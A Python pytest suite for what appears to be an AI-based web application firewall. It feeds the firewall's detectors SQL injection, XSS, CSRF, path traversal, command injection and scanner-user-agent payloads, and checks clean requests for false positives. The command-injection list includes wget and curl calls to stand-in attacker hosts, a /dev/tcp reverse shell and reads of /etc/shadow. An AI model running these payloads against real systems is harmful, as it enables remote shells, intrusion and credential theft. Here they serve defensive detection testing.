"""
AI WAF Test Suite
Tests for: SQLi, XSS, CSRF, Path Traversal, Command Injection, Clean requests
Run with: pytest tests/ -v
"""

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import pytest
from app.ml.detector import ThreatDetector
from app.models.rule_engine import RuleEngine


# ── Fixtures ──────────────────────────────────────────────

@pytest.fixture(scope="module")
def detector():
    return ThreatDetector()

@pytest.fixture(scope="module")
def rule_engine():
    return RuleEngine()


def make_request(
    payload="",
    field="query_string",
    method="GET",
    path="/search",
    user_agent="Mozilla/5.0",
    body="",
    origin="",
    referer="",
    host="example.com"
):
    return {
        "ip": "10.0.0.1",
        "method": method,
        "path": path,
        "query_string": payload if field == "query_string" else "",
        "body": payload if field == "body" else body,
        "headers": {
            "user-agent": payload if field == "user_agent" else user_agent,
            "host": host,
            "origin": origin,
            "referer": referer,
            "content-type": "application/x-www-form-urlencoded",
        },
        "cookies": {},
        "user_agent": user_agent,
        "content_type": "application/x-www-form-urlencoded",
        "referer": referer,
        "origin": origin,
        "full_url": f"http://{host}{path}",
        "timestamp": "2024-01-01T00:00:00",
    }


# ── SQL Injection Tests ────────────────────────────────────

class TestSQLiDetection:
    SQL_PAYLOADS = [
        "' OR 1=1 --",
        "' OR '1'='1",
        "1; DROP TABLE users--",
        "1 UNION SELECT username,password FROM users--",
        "' UNION SELECT NULL,NULL,NULL--",
        "admin'--",
        "1' AND SLEEP(5)--",
        "1 WAITFOR DELAY '0:0:5'--",
        "' OR 1=1#",
        "1; SELECT * FROM information_schema.tables--",
        "' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--",
        "UNION ALL SELECT NULL,NULL,NULL--",
        "1 OR BENCHMARK(10000000,MD5(1))--",
    ]

    def test_sqli_rule_engine(self, rule_engine):
        for payload in self.SQL_PAYLOADS:
            req = make_request(payload=payload)
            result = rule_engine.analyze(req)
            assert result["blocked"] or result["confidence"] > 0.5, \
                f"SQLi not detected by rules: {payload!r}"

    def test_sqli_ai_detector(self, detector):
        for payload in self.SQL_PAYLOADS:
            req = make_request(payload=payload)
            result = detector.analyze(req)
            assert result["confidence"] > 0.3, \
                f"SQLi not detected by AI: {payload!r} (conf={result['confidence']})"

    def test_sqli_in_body(self, rule_engine):
        req = make_request(payload="' OR 1=1--", field="body", method="POST")
        result = rule_engine.analyze(req)
        assert result["blocked"]

    def test_sqli_union_select(self, rule_engine):
        req = make_request(payload="1 UNION SELECT username,password FROM users")
        result = rule_engine.analyze(req)
        assert result["blocked"]
        assert "SQLi" in result["attack_types"]

    def test_sqli_time_based_mysql(self, rule_engine):
        req = make_request(payload="1' AND SLEEP(5)--")
        result = rule_engine.analyze(req)
        assert result["blocked"]

    def test_sqli_time_based_mssql(self, rule_engine):
        req = make_request(payload="'; WAITFOR DELAY '0:0:5'--")
        result = rule_engine.analyze(req)
        assert result["blocked"]


# ── XSS Tests ─────────────────────────────────────────────

class TestXSSDetection:
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<script>document.cookie</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<body onload=alert(1)>",
        '"><script>alert("xss")</script>',
        "<iframe src=javascript:alert(1)>",
        "<a href=javascript:alert(1)>click</a>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        "<input type=text onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
    ]

    def test_xss_rule_engine(self, rule_engine):
        for payload in self.XSS_PAYLOADS:
            req = make_request(payload=payload)
            result = rule_engine.analyze(req)
            assert result["blocked"] or result["confidence"] > 0.4, \
                f"XSS not detected by rules: {payload!r}"

    def test_xss_ai_detector(self, detector):
        for payload in self.XSS_PAYLOADS:
            req = make_request(payload=payload)
            result = detector.analyze(req)
            assert result["confidence"] > 0.3, \
                f"XSS not detected by AI: {payload!r} (conf={result['confidence']})"

    def test_xss_script_tag(self, rule_engine):
        req = make_request(payload="<script>alert(1)</script>")
        result = rule_engine.analyze(req)
        assert result["blocked"]
        assert "XSS" in result["attack_types"]

    def test_xss_event_handler(self, rule_engine):
        req = make_request(payload='<img src=x onerror=alert(1)>')
        result = rule_engine.analyze(req)
        assert result["blocked"]

    def test_xss_javascript_protocol(self, rule_engine):
        req = make_request(payload="javascript:alert(document.cookie)")
        result = rule_engine.analyze(req)
        assert result["blocked"]


# ── CSRF Tests ─────────────────────────────────────────────

class TestCSRFDetection:

    def test_csrf_origin_mismatch(self, detector):
        req = make_request(
            method="POST",
            body="amount=1000&to=attacker",
            origin="https://evil.com",
            host="bank.com"
        )
        result = detector.analyze(req)
        assert result["confidence"] > 0.3, "CSRF origin mismatch not detected"

    def test_csrf_referer_mismatch(self, detector):
        req = make_request(
            method="POST",
            body="action=transfer",
            referer="https://attacker.com/evil.html",
            host="victim.com"
        )
        result = detector.analyze(req)
        assert result["confidence"] > 0.2, "CSRF referer mismatch not detected"

    def test_csrf_no_token_post(self, detector):
        req = make_request(
            method="POST",
            body="username=admin&password=secret",
            host="example.com"
        )
        result = detector.analyze(req)
        # Should flag as suspicious (no token)
        assert result["confidence"] >= 0.0  # At minimum, no crash

    def test_csrf_get_request_safe(self, detector):
        req = make_request(method="GET", path="/profile")
        result = detector.analyze(req)
        # GET requests should not trigger CSRF checks
        csrf_conf = result.get("details", {}).get("CSRF", {}).get("score", 0)
        assert csrf_conf == 0.0


# ── Path Traversal Tests ──────────────────────────────────

class TestPathTraversalDetection:
    TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//etc/passwd",
        "/etc/passwd",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "file:///etc/passwd",
        "../../boot.ini",
        "/proc/self/environ",
        "/var/log/apache2/access.log",
    ]

    def test_path_traversal_rule_engine(self, rule_engine):
        for payload in self.TRAVERSAL_PAYLOADS:
            req = make_request(payload=payload, path=f"/{payload}")
            result = rule_engine.analyze(req)
            assert result["blocked"] or result["confidence"] > 0.3, \
                f"Path traversal not detected: {payload!r}"

    def test_path_traversal_etc_passwd(self, rule_engine):
        req = make_request(payload="../../etc/passwd")
        result = rule_engine.analyze(req)
        assert result["blocked"]

    def test_php_wrapper(self, rule_engine):
        req = make_request(payload="php://filter/convert.base64-encode/resource=config.php")
        result = rule_engine.analyze(req)
        assert result["blocked"]


# ── Command Injection Tests ───────────────────────────────

class TestCommandInjectionDetection:
    CMD_PAYLOADS = [
        "; ls -la",
        "| cat /etc/passwd",
        "& whoami",
        "`id`",
        "$(cat /etc/shadow)",
        "; wget http://evil.com/shell.sh",
        "| curl http://attacker.com",
        "test; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
    ]

    def test_command_injection_detection(self, rule_engine, detector):
        for payload in self.CMD_PAYLOADS:
            req = make_request(payload=payload)
            r_result = rule_engine.analyze(req)
            a_result = detector.analyze(req)
            detected = r_result["blocked"] or a_result["confidence"] > 0.3
            assert detected, f"Command injection not detected: {payload!r}"

    def test_null_byte_injection(self, rule_engine):
        req = make_request(payload="file.php%00.jpg")
        result = rule_engine.analyze(req)
        assert result["blocked"] or result["confidence"] > 0.3


# ── Scanner / Bot Detection ───────────────────────────────

class TestBotDetection:
    SCANNER_UAS = [
        "sqlmap/1.7.8",
        "Nikto/2.1.6",
        "Nessus",
        "BurpSuite",
        "Acunetix Web Vulnerability Scanner",
        "w3af.org",
        "dirbuster",
        "nuclei",
        "havij",
    ]

    def test_scanner_user_agents(self, rule_engine, detector):
        for ua in self.SCANNER_UAS:
            req = make_request(user_agent=ua, field="user_agent")
            r_result = rule_engine.analyze(req)
            a_result = detector.analyze(req)
            detected = r_result["blocked"] or a_result["confidence"] > 0.5
            assert detected, f"Scanner UA not detected: {ua!r}"


# ── Clean Request Tests ───────────────────────────────────

class TestCleanRequests:
    CLEAN_PAYLOADS = [
        "hello world",
        "search=python+tutorial",
        "user@example.com",
        "page=2&sort=asc",
        "name=John+Doe&age=30",
        "product_id=12345",
        "category=books&q=machine+learning",
        "/api/v1/users/profile",
        "SELECT is the best word",  # contains SQL keyword but not injection
    ]

    def test_clean_requests_not_blocked(self, rule_engine, detector):
        for payload in self.CLEAN_PAYLOADS:
            req = make_request(payload=payload)
            r_result = rule_engine.analyze(req)
            a_result = detector.analyze(req)
            assert not r_result["blocked"], \
                f"False positive (rule): {payload!r}"
            # AI may have some score but should not be high
            assert a_result["confidence"] < 0.75, \
                f"False positive (AI): {payload!r} conf={a_result['confidence']}"

    def test_normal_get_request(self, rule_engine, detector):
        req = make_request(path="/home", method="GET")
        r_result = rule_engine.analyze(req)
        a_result = detector.analyze(req)
        assert not r_result["blocked"]
        assert a_result["confidence"] < 0.5

    def test_normal_post_request(self, rule_engine):
        req = make_request(
            method="POST",
            body="username=alice&password=securePass123",
            field="body"
        )
        result = rule_engine.analyze(req)
        assert not result["blocked"]


# ── Edge Cases ────────────────────────────────────────────

class TestEdgeCases:

    def test_empty_request(self, rule_engine, detector):
        req = make_request()
        r = rule_engine.analyze(req)
        a = detector.analyze(req)
        assert not r["blocked"]
        assert a["confidence"] < 0.5

    def test_very_long_payload(self, rule_engine, detector):
        payload = "A" * 10000
        req = make_request(payload=payload)
        r = rule_engine.analyze(req)
        a = detector.analyze(req)
        # Should not crash; may or may not block
        assert isinstance(r["blocked"], bool)
        assert isinstance(a["blocked"], bool)

    def test_unicode_payload(self, rule_engine, detector):
        payload = "用户名=测试&密码=安全"
        req = make_request(payload=payload)
        r = rule_engine.analyze(req)
        assert not r["blocked"]

    def test_url_encoded_sqli(self, rule_engine):
        # URL-encoded ' OR 1=1--
        payload = "%27%20OR%201%3D1--"
        req = make_request(payload=payload)
        result = rule_engine.analyze(req)
        # Decoded by middleware before reaching rule engine
        # This tests raw encoded form
        assert isinstance(result["blocked"], bool)

    def test_double_encoded_xss(self, detector):
        payload = "%253Cscript%253Ealert(1)%253C%252Fscript%253E"
        req = make_request(payload=payload)
        result = detector.analyze(req)
        assert isinstance(result["blocked"], bool)


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
